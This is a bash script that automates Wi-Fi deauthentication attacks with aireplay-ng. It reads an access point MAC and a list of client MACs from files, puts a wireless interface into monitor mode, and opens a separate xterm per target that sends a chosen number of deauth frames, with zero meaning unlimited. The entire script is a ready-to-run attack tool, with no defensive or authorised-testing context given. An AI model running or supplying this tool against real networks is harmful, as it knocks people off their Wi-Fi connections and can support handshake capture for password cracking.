#!/bin/bash
# Runs aireplay-ng to deauth a list of clients
# apMac.txt == MAC of the access point
# targets.txt == list of mac address

# The Help file
while getopts "h" OPTION
do
	case $OPTION in
		h)
			echo $div
			echo " [*] Place the access point MAC address in the apMac.txt file. Only accepts one address"
			echo " [*] Place the list of Client MAC addresses in the targets.txt file. One address per line"
			echo " [*] NO EXTRA PUNCTUATION OR JUMK TEXT"
			echo " [*] Targets.txt can contain 'Client ' from kimset-ui logic will remove it"
			echo $div
			exit
			;;
	esac
done

# x,y positons for spawning xterm windows
X=(+0 -0 -0 +0 +600 +300 -600 -600 -300 +200 +700)
Y=(+0 +0 -0 -0 -500 -300 +800 +500 +300 +200 -700)

# Divider
div='-------------------------------------------------------------------------------------------'
# Iteration variable for positon arrays
i=0

# Check if file has been executed as root
if [ "$EUID" -ne 0 ]
  then echo -e "Run as ${BlinkStart}root ${BlindEnd}moron"
  exit
fi

# Get current secounds since epoch, for unique temporary file names
ID=$(date +"%s")

# Declare temporay file names
output="Output"
targets="targets"
apMac="apMac"
targetsLower="targetsLower"
apMacLower="apMacLower"

# Exit trap command

function finish() {
  	# Cleanup temporary files
	echo $div
	echo 'Cleaning up...'
	echo $div
	if [ -f $ID$targetsLower.txt ]; then
    		sudo rm $ID$targetsLower.txt
	fi
	if [ -f $ID$targets.txt ]; then
    		sudo rm $ID$targets.txt
	fi
	if [ -f $ID$apMacLower.txt ]; then
    		sudo rm $ID$apMacLower.txt
	fi
	if [ -f $ID$apMac.txt ]; then
    		sudo rm $ID$apMac.txt
	fi
	if [ -f $ID$output.txt ]; then
		sudo rm $ID$output.txt
	fi
	

}
trap finish EXIT

# Move supplied targets into temp targets file
cat targets.txt > $ID$targets.txt

# Move the Access Point Mac into a temp folder
cat apMac.txt > $ID$apMac.txt

# Read interface and check if available
iw dev
printf "Interface name:  "
read int
echo $div
intState=`iw dev > $ID$output.txt` 
if grep -q $int $ID$output.txt; then
	echo -e "Target interface ${BlinkStart}is available${BlinkEnd}"
	echo $div
else 
	echo -e "Target is ${BlinkStart}NOT available${BlinkEnd}"
	exit
fi

# Ensure monitor is enabled, if not start monitor and check again, otherwise continue
sudo iw $int info > $ID$output.txt
if grep -q monitor $ID$output.txt; then
	successMessage="Target is in monitor mode"
	echo -e "${successMessage/Target/$int}"
	echo $div
else 
	echo "Target interface is not in Monitor mode"
	echo $div
	MonitorMessage="Putting interface into monitor"
	echo -e "${MonitorMessage/interface/$int}"
	echo $div
	sudo airmon-ng start $int > /dev/null
	sudo iw $int info > $ID$output.txt
	if grep -q monitor $ID$output.txt; then
		successMessage="Target is in monitor mode"
		echo "${successMessage/Target/$int}"
		echo $div
	fi
fi

# If interface was put into monitor by previous logic add 'mon' to int
if [[ $int != *'mon'* ]]; then
	int=$int'mon'
	
fi
# Read channel and set interface to that channel
printf "channel target is on:   "
read channel
echo $div
sudo iwconfig $int channel $channel

# Get number of Deauths 
printf "Enter the number of Deauths to send, 0 is infinite:    "
read deauths

# Check if 'Client ' is present, if so REMOVE THEM
#if grep -q 'Client '$ID$targets.txt; then
#	sed -i 's/Client //g' $ID$targets.txt
#fi
# Convert all macaddress to lowercase
tr '[:upper:]' '[:lower:]' < $ID$targets.txt > $ID$targetsLower.txt
tr '[:upper:]' '[:lower:]' < $ID$apMac.txt > $ID$apMacLower.txt
apMac=`cat $ID$apMacLower.txt`

# Start  aireplay-ng -0 1 -a Access point mac -c client mac interface
# each client gets their own terminal window
#echo $int
cat $ID$targetsLower.txt | while read line; do
	xterm -geometry 90x20${X[i]}${Y[i]} -hold -e sudo aireplay-ng -0 $deauths -a $apMac -c $line $int &
	i=$((i+1))
done

